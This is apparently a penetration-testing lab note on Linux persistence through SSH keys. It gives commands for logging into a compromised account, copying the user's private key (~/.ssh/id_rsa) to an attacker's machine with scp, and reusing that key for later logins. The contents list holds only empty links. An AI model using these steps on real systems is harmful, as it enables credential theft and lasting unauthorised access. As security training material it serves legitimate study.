# Linux Persistence

## Contents
- []()
- []()
- []()
- []()
- []()
- []()
- []()
- []()

## Persistence Via SSH Keys

### How SSH Works & How it Can Be Used for Persistence
- Linux is typically deployed as a server operating system and as a result Linux servers are typically accessed remotely via services (protocols) like SSH.
- If SSH is enabled and running on a Linux system that you have compromised, you can take advantage of the SSH configuration to establish persistent access on the target system.
- In most cases Linux servers will have key-based authentication enabled for the SSH service.
  - This allows the users to access the Linux system remotely without the need for a password.
- After gaining access to a Linux system, we can transfer the SSH private key of a specific user account to our system and then use that SSH private key for all future authentication and access.
  - **_The essential step in all of this is finding the private key on the target system_.**
- You could also generate a new public/private key pair, transfer the public key to the target Linux system, and use the private key to login. 

### Generating SSH Keys
```
ssh-keygen -t rsa -C "add any comment to label your key here"
```
- `-t rsa` : sets the type of algorithm to rsa
- `-C` : optional to add a short comment to "label" your key pair

### Key Pair
1. `id_rsa` : private key
2. `id_rsa.pub` : public key

### Example
> The follow is from a lab. It shows the general process, commands, and techniques that can be replicated on other similar systems.

#### Initial Access
- We have gained access to a target Linux system via creds. Therefore we can login via ssh.
```
ssh compromised_username@[target ip]
```

#### Copy the id_rsa File
- We want to copy the `id_rsa` file from the compromised target account onto our attack system.
- Exit the target. Back in your attack machine, use the secure copy command: `scp`
  - scp copies files between hosts on a network.
  - It uses ssh for data transfer, and uses the same authentication and provides the same security as ssh.
```
# General Syntax:
[user]@[host1 or ip address]:/path/to/file-to-copy /path/to/local/copy-target
# Example: 
scp Syntax: scp compromised_username@[target ip]:~/.ssh/id_rsa .
```
- Once that copies to your local (attack) machine, you need to change the perms to what is expected of a private key
```
chmod 400 id_rsa      # this is required; ssh will pitch a fit if you don't
```
- Now you can use this private key to log into the target system via ssh.

#### Persistence
- Login with the ssh private key:
```
ssh -i id_rsa compromised_username@[target ip]
```
- `-i` : identity_file - Selects a file from which the identity (private key) for RSA or DSA authentication is read.
  - The default for ssh protocol version 1 is `~/.ssh/identity`
  - The default for ssh protocol version 2 is `~/.ssh/id_rsa` and `~/.ssh/id_dsa`
- That should log you onto the system without providing a password
